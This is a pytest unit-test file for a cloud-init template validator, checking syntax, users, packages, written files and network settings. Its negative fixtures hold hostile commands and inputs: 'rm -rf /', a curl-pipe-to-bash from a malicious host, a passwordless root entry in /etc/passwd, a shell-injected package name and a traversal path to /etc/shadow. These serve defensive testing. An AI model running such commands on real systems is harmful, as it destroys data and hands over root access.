#!/usr/bin/env python3
"""
Unit Tests for Cloud-init Template Validation
Tests for cloud-init template syntax, structure, and security validation
"""

import base64
import json
import yaml
from pathlib import Path
from unittest.mock import Mock, patch

import pytest


class TestCloudInitTemplateValidation:
    """Test cases for cloud-init template validation."""

    @pytest.fixture
    def valid_user_data_templates(self):
        """Collection of valid cloud-init user-data templates."""
        return {
            'basic_server': '''#cloud-config
users:
  - name: ubuntu
    sudo: ALL=(ALL) NOPASSWD:ALL
    shell: /bin/bash
    ssh_authorized_keys:
      - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... admin@example.com

packages:
  - curl
  - wget
  - git
  - htop

package_update: true
package_upgrade: true

runcmd:
  - systemctl enable ssh
  - systemctl start ssh
  - ufw enable
''',
            'docker_host': '''#cloud-config
users:
  - name: docker-admin
    sudo: ALL=(ALL) NOPASSWD:ALL
    groups: docker
    shell: /bin/bash

packages:
  - docker.io
  - docker-compose
  - vim

write_files:
  - path: /etc/docker/daemon.json
    content: |
      {
        "storage-driver": "overlay2",
        "log-driver": "json-file",
        "log-opts": {
          "max-size": "10m",
          "max-file": "3"
        }
      }
    permissions: '0644'

runcmd:
  - systemctl enable docker
  - systemctl start docker
  - usermod -aG docker ubuntu
''',
            'monitoring_server': '''#cloud-config
hostname: monitoring-01
fqdn: monitoring-01.example.com

users:
  - name: monitor
    sudo: ALL=(ALL) NOPASSWD:ALL
    
packages:
  - prometheus
  - grafana
  - node-exporter

write_files:
  - path: /etc/prometheus/prometheus.yml
    content: |
      global:
        scrape_interval: 15s
      scrape_configs:
        - job_name: 'node'
          static_configs:
            - targets: ['localhost:9100']
    permissions: '0644'
    owner: prometheus:prometheus

runcmd:
  - systemctl enable prometheus
  - systemctl start prometheus
  - systemctl enable grafana-server
  - systemctl start grafana-server
'''
        }

    @pytest.fixture
    def valid_meta_data_templates(self):
        """Collection of valid meta-data templates."""
        return {
            'basic_metadata': '''instance-id: server-001
local-hostname: test-server
public-keys:
  - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... admin@example.com
''',
            'advanced_metadata': '''instance-id: web-server-01
local-hostname: web-01
availability-zone: us-west-1a
public-keys:
  - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... admin@example.com
placement:
  availability-zone: us-west-1a
  group-name: web-servers
'''
        }

    @pytest.fixture
    def valid_network_config_templates(self):
        """Collection of valid network configuration templates."""
        return {
            'static_network': '''version: 2
ethernets:
  eth0:
    addresses: [192.168.1.100/24]
    gateway4: 192.168.1.1
    nameservers:
      addresses: [8.8.8.8, 8.8.4.4]
''',
            'dhcp_network': '''version: 2
ethernets:
  eth0:
    dhcp4: true
    dhcp6: false
''',
            'bonded_network': '''version: 2
ethernets:
  eth0:
    dhcp4: no
  eth1:
    dhcp4: no
bonds:
  bond0:
    interfaces: [eth0, eth1]
    parameters:
      mode: active-backup
      primary: eth0
    addresses: [192.168.1.100/24]
    gateway4: 192.168.1.1
'''
        }

    @pytest.fixture
    def invalid_templates(self):
        """Collection of invalid cloud-init templates."""
        return {
            'invalid_yaml_syntax': '''#cloud-config
users:
  - name: ubuntu
    sudo: ALL=(ALL) NOPASSWD:ALL
    invalid_yaml:
  - missing_value
''',
            'missing_cloud_config_header': '''users:
  - name: ubuntu
    sudo: ALL=(ALL) NOPASSWD:ALL
''',
            'invalid_user_structure': '''#cloud-config
users:
  - ubuntu  # Should be a dictionary, not string
''',
            'dangerous_commands': '''#cloud-config
runcmd:
  - rm -rf /
  - curl http://malicious-site.com/script.sh | bash
  - echo "malicious content" > /etc/passwd
''',
            'invalid_network_config': '''version: 2
ethernets:
  eth0:
    addresses: [invalid-ip-address]
    gateway4: not-an-ip
'''
        }

    @pytest.mark.cloud_init
    def test_validate_user_data_templates(self, valid_user_data_templates):
        """Test validation of valid user-data templates."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_cloud_init_template
        
        for template_name, template_content in valid_user_data_templates.items():
            result = validate_cloud_init_template(template_content, template_type='user-data')
            
            assert result['valid'] == True, f"Template {template_name} should be valid"
            assert 'errors' not in result or len(result['errors']) == 0
            if 'warnings' in result:
                # Warnings are acceptable for valid templates
                pass

    @pytest.mark.cloud_init
    def test_validate_meta_data_templates(self, valid_meta_data_templates):
        """Test validation of valid meta-data templates."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_cloud_init_template
        
        for template_name, template_content in valid_meta_data_templates.items():
            result = validate_cloud_init_template(template_content, template_type='meta-data')
            
            assert result['valid'] == True, f"Meta-data template {template_name} should be valid"
            assert 'errors' not in result or len(result['errors']) == 0

    @pytest.mark.cloud_init
    def test_validate_network_config_templates(self, valid_network_config_templates):
        """Test validation of valid network configuration templates."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_cloud_init_template
        
        for template_name, template_content in valid_network_config_templates.items():
            result = validate_cloud_init_template(template_content, template_type='network-config')
            
            assert result['valid'] == True, f"Network config template {template_name} should be valid"
            assert 'errors' not in result or len(result['errors']) == 0

    @pytest.mark.cloud_init
    def test_validate_invalid_templates(self, invalid_templates):
        """Test validation of invalid templates."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_cloud_init_template
        
        for template_name, template_content in invalid_templates.items():
            result = validate_cloud_init_template(template_content, template_type='user-data')
            
            assert result['valid'] == False, f"Template {template_name} should be invalid"
            assert 'errors' in result
            assert len(result['errors']) > 0

    def test_yaml_syntax_validation(self):
        """Test YAML syntax validation."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_yaml_syntax
        
        valid_yaml = '''
key1: value1
key2:
  - item1
  - item2
key3:
  nested_key: nested_value
'''
        
        invalid_yaml = '''
key1: value1
key2:
  - item1
  - item2
    invalid_indentation
'''
        
        assert validate_yaml_syntax(valid_yaml) == True
        assert validate_yaml_syntax(invalid_yaml) == False

    def test_cloud_config_header_validation(self):
        """Test cloud-config header validation."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_cloud_config_header
        
        valid_headers = [
            '#cloud-config',
            '#cloud-config\n',
            '#!/bin/bash\n#cloud-config',
        ]
        
        invalid_headers = [
            'users:\n  - name: ubuntu',
            '#invalid-header',
            '',
        ]
        
        for header in valid_headers:
            content = header + '\nusers:\n  - name: ubuntu'
            assert validate_cloud_config_header(content) == True
        
        for header in invalid_headers:
            content = header + '\nusers:\n  - name: ubuntu'
            assert validate_cloud_config_header(content) == False

    def test_security_validation(self):
        """Test security validation of cloud-init templates."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_security
        
        secure_template = '''#cloud-config
users:
  - name: ubuntu
    sudo: ALL=(ALL) NOPASSWD:ALL
packages:
  - curl
  - vim
runcmd:
  - systemctl enable ssh
'''
        
        insecure_templates = [
            '''#cloud-config
runcmd:
  - rm -rf /
''',
            '''#cloud-config
runcmd:
  - curl http://malicious.com/script.sh | bash
''',
            '''#cloud-config
write_files:
  - path: /etc/passwd
    content: |
      root::0:0:root:/root:/bin/bash
'''
        ]
        
        result = validate_security(secure_template)
        assert result['secure'] == True
        
        for template in insecure_templates:
            result = validate_security(template)
            assert result['secure'] == False
            assert len(result['security_issues']) > 0

    def test_package_validation(self):
        """Test package list validation."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_packages
        
        valid_packages = [
            'curl',
            'wget',
            'git',
            'docker.io',
            'prometheus',
            'nginx'
        ]
        
        invalid_packages = [
            '../malicious-package',
            'package-with-shell-injection; rm -rf /',
            'http://malicious.com/package.deb'
        ]
        
        for package in valid_packages:
            template = f'#cloud-config\npackages:\n  - {package}'
            result = validate_packages(template)
            assert result['valid'] == True
        
        for package in invalid_packages:
            template = f'#cloud-config\npackages:\n  - {package}'
            result = validate_packages(template)
            assert result['valid'] == False

    def test_user_configuration_validation(self):
        """Test user configuration validation."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_users
        
        valid_user_configs = [
            '''#cloud-config
users:
  - name: ubuntu
    sudo: ALL=(ALL) NOPASSWD:ALL
    shell: /bin/bash
''',
            '''#cloud-config
users:
  - name: admin
    groups: [sudo, docker]
    shell: /bin/bash
    ssh_authorized_keys:
      - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...
'''
        ]
        
        invalid_user_configs = [
            '''#cloud-config
users:
  - name: root  # Should not allow root user
    sudo: ALL=(ALL) NOPASSWD:ALL
''',
            '''#cloud-config
users:
  - name: user-with-dangerous-sudo
    sudo: ALL=(ALL) NOPASSWD:ALL, /bin/rm -rf /
'''
        ]
        
        for config in valid_user_configs:
            result = validate_users(config)
            assert result['valid'] == True
        
        for config in invalid_user_configs:
            result = validate_users(config)
            assert result['valid'] == False

    def test_file_writing_validation(self):
        """Test write_files section validation."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_write_files
        
        valid_file_configs = [
            '''#cloud-config
write_files:
  - path: /etc/myapp/config.yaml
    content: |
      app:
        debug: false
    permissions: '0644'
    owner: root:root
''',
            '''#cloud-config
write_files:
  - path: /opt/scripts/startup.sh
    content: |
      #!/bin/bash
      echo "Starting application"
      systemctl start myapp
    permissions: '0755'
'''
        ]
        
        invalid_file_configs = [
            '''#cloud-config
write_files:
  - path: /etc/passwd  # Dangerous system file
    content: |
      malicious content
''',
            '''#cloud-config
write_files:
  - path: /tmp/../../../etc/shadow
    content: malicious
'''
        ]
        
        for config in valid_file_configs:
            result = validate_write_files(config)
            assert result['valid'] == True
        
        for config in invalid_file_configs:
            result = validate_write_files(config)
            assert result['valid'] == False

    def test_network_configuration_validation(self):
        """Test network configuration validation."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_network_config
        
        valid_config = '''version: 2
ethernets:
  eth0:
    addresses: [192.168.1.100/24]
    gateway4: 192.168.1.1
    nameservers:
      addresses: [8.8.8.8, 8.8.4.4]
'''
        
        invalid_configs = [
            '''version: 2
ethernets:
  eth0:
    addresses: [invalid-ip]
''',
            '''version: 2
ethernets:
  eth0:
    gateway4: not-an-ip
'''
        ]
        
        result = validate_network_config(valid_config)
        assert result['valid'] == True
        
        for config in invalid_configs:
            result = validate_network_config(config)
            assert result['valid'] == False

    def test_template_variable_substitution(self):
        """Test template variable substitution and validation."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import substitute_template_variables
        
        template_with_vars = '''#cloud-config
hostname: {{hostname}}
users:
  - name: {{username}}
    ssh_authorized_keys:
      - {{ssh_key}}
runcmd:
  - echo "Server {{hostname}} configured for {{environment}}"
'''
        
        variables = {
            'hostname': 'web-server-01',
            'username': 'admin',
            'ssh_key': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...',
            'environment': 'production'
        }
        
        result = substitute_template_variables(template_with_vars, variables)
        
        assert 'web-server-01' in result
        assert 'admin' in result
        assert '{{' not in result  # All variables should be substituted

    def test_base64_encoding_validation(self):
        """Test base64 encoded content validation."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_base64_content
        
        # Test valid base64 content
        original_content = "echo 'Hello World'"
        encoded_content = base64.b64encode(original_content.encode()).decode()
        
        template_with_encoded = f'''#cloud-config
write_files:
  - path: /tmp/script.sh
    content: {encoded_content}
    encoding: base64
    permissions: '0755'
'''
        
        result = validate_base64_content(template_with_encoded)
        assert result['valid'] == True
        
        # Test invalid base64
        template_with_invalid = '''#cloud-config
write_files:
  - path: /tmp/script.sh
    content: invalid-base64-content!@#
    encoding: base64
'''
        
        result = validate_base64_content(template_with_invalid)
        assert result['valid'] == False

    def test_comprehensive_template_validation(self):
        """Test comprehensive validation combining all checks."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import CloudInitValidator
        
        validator = CloudInitValidator()
        
        comprehensive_template = '''#cloud-config
hostname: test-server
fqdn: test-server.example.com

users:
  - name: ubuntu
    sudo: ALL=(ALL) NOPASSWD:ALL
    shell: /bin/bash
    groups: [sudo, docker]
    ssh_authorized_keys:
      - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... admin@example.com

packages:
  - curl
  - wget
  - git
  - docker.io
  - vim

package_update: true
package_upgrade: true

write_files:
  - path: /etc/docker/daemon.json
    content: |
      {
        "storage-driver": "overlay2",
        "log-driver": "json-file"
      }
    permissions: '0644'
    owner: root:root
  - path: /opt/scripts/startup.sh
    content: |
      #!/bin/bash
      systemctl start docker
    permissions: '0755'

runcmd:
  - systemctl enable docker
  - systemctl start docker
  - usermod -aG docker ubuntu
  - /opt/scripts/startup.sh

final_message: "Server configuration complete"
'''
        
        result = validator.validate(comprehensive_template, template_type='user-data')
        
        assert result['valid'] == True
        assert result['template_type'] == 'user-data'
        if 'warnings' in result:
            # Check that warnings are reasonable
            for warning in result['warnings']:
                assert 'sudo' in warning.lower() or 'security' in warning.lower()

    @pytest.mark.parametrize("template_type", ['user-data', 'meta-data', 'network-config'])
    def test_template_type_specific_validation(self, template_type):
        """Test type-specific validation for different cloud-init template types."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_template_type
        
        templates = {
            'user-data': '#cloud-config\nusers:\n  - name: ubuntu',
            'meta-data': 'instance-id: test-01\nlocal-hostname: test',
            'network-config': 'version: 2\nethernets:\n  eth0:\n    dhcp4: true'
        }
        
        # Test correct type validation
        result = validate_template_type(templates[template_type], template_type)
        assert result['valid'] == True
        
        # Test incorrect type validation (user-data content with meta-data type)
        if template_type != 'user-data':
            result = validate_template_type(templates['user-data'], template_type)
            assert result['valid'] == False

    def test_template_size_validation(self):
        """Test template size limits."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_template_size
        
        # Test normal size template
        normal_template = '#cloud-config\nusers:\n  - name: ubuntu'
        result = validate_template_size(normal_template)
        assert result['valid'] == True
        
        # Test oversized template (create large content)
        large_content = '#cloud-config\n' + 'x' * (1024 * 1024)  # 1MB+ of content
        result = validate_template_size(large_content, max_size_kb=512)
        assert result['valid'] == False
        assert 'size_exceeded' in result

    def test_template_complexity_validation(self):
        """Test template complexity validation."""
        from gough.containers.management_server.py4web_app.lib.cloud_init_processor import validate_template_complexity
        
        # Simple template
        simple_template = '''#cloud-config
users:
  - name: ubuntu
packages:
  - curl
'''
        
        # Complex template with many sections
        complex_template = '''#cloud-config
users:
  - name: ubuntu
  - name: admin
  - name: service

packages:
  - curl
  - wget
  - git
  # ... many more packages

write_files:
  - path: /etc/file1
    content: content1
  - path: /etc/file2
    content: content2
  # ... many more files

runcmd:
  - command1
  - command2
  # ... many more commands
'''
        
        simple_result = validate_template_complexity(simple_template)
        assert simple_result['complexity_score'] < 50
        
        complex_result = validate_template_complexity(complex_template)
        assert complex_result['complexity_score'] > simple_result['complexity_score']